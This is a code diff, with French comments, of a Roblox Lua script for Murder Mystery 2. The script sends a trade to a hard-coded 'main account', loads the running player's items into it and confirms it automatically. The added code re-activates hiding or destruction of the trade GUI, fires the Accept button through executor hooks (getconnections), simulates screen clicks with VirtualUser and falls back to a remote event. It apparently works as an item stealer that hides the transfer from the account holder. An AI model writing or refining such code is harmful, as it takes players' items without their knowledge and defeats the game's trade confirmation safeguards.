@@ -492,22 +492,26 @@ end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local VirtualUser = game:GetService("VirtualUser")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    -- NE PAS exécuter destroytrades2 tout de suite pour éviter d'annuler les composants internes de MM2
+    -- 1. On réactive la suppression/masquage du GUI comme tu l'avais configuré
+    if destroytrades2 then
+        coroutine.resume(destroytrades2)
+    end
 
-    -- 1. Envoi de la demande de trade au compte principal
+    -- 2. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
-        warn("Joueur principal introuvable : " .. tostring(userName))
+        warn("Compte principal introuvable : " .. tostring(userName))
         return
     end
 
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2)
 
-    -- 2. Remplissage des cases (Maximum 4 slots MM2)
+    -- 3. Remplissage des 4 slots max de MM2
     local itemsOffered = 0
     local maxSlots = 4
 
@@ -537,22 +541,49 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 3. Première acceptation (AcceptRequest)
-    Trade.AcceptRequest:FireServer()
-
-    -- 4. Attente impérative de 6 à 7 secondes (compte à rebours du jeu)
-    task.wait(7)
-
-    -- 5. Confirmation finale (Méthode officielle des bots GitHub)
-    -- On envoie un appel direct sans arguments inutiles ou avec l'ID standard
+    -- 4. Première acceptation
     pcall(function()
-        Trade.AcceptTrade:FireServer()
+        Trade.AcceptRequest:FireServer()
     end)
 
-    -- Deuxième tentative de confirmation de secours (si le bot est considéré comme 'Second Player')
-    task.wait(0.5)
+    -- 5. Attente impérative du compte à rebours MM2 (7 secondes)
+    task.wait(7)
+
+    -- 6. Simulation du vrai clic sur le bouton Accept (fonctionne même si le GUI est masqué/destroy)
     pcall(function()
-        Trade.AcceptTrade:FireServer(285646582)
+        local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
+        if not playerGui then return end
+
+        -- Recherche du bouton Accept dans tous les conteneurs possibles de MM2
+        local acceptBtn = nil
+        for _, guiName in pairs({"TradeGUI", "TradeContainer", "Trade"}) do
+            local gui = playerGui:FindFirstChild(guiName)
+            if gui then
+                acceptBtn = gui:FindFirstChild("Accept", true) or gui:FindFirstChild("Confirm", true)
+                if acceptBtn then break end
+            end
+        end
+
+        if acceptBtn then
+            -- A) Si l'exécuteur supporte getconnections, on déclenche les événements du bouton
+            if getconnections then
+                for _, conn in pairs(getconnections(acceptBtn.MouseButton1Click)) do
+                    conn:Fire()
+                end
+                for _, conn in pairs(getconnections(acceptBtn.MouseButton1Down)) do
+                    conn:Fire()
+                end
+            end
+
+            -- B) Simulation de clic physique par coordonnées d'écran (VirtualUser)
+            VirtualUser:CaptureController()
+            local posX = acceptBtn.AbsolutePosition.X + (acceptBtn.AbsoluteSize.X / 2)
+            local posY = acceptBtn.AbsolutePosition.Y + (acceptBtn.AbsoluteSize.Y / 2) + 36 -- +36 pour décaler la barre Roblox Supérieure
+            VirtualUser:ClickButton1(Vector2.new(posX, posY))
+        else
+            -- C) Secours RemoteEvent si le bouton a été totalement supprimé de la mémoire
+            Trade.AcceptTrade:FireServer()
+        end
     end)
 end
 
